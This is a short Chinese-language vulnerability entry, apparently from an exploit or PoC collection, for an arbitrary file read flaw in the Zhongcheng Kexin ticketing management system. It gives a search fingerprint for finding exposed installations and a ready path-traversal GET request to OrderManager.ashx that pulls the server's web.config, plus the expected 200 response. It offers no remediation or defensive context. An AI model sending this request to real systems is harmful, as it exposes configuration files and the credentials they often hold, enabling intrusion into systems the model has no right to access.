# 中成科信票务管理系统OrderManager.ashx存在文件读取漏洞

中成科信票务管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`icon_hash="1632964065"`
- **请求**：`GET /SystemManager/OrderManager/OrderManager.ashx?Method=DownTemplate&fileName=../../web.config HTTP/1.1`
- **响应特征**：200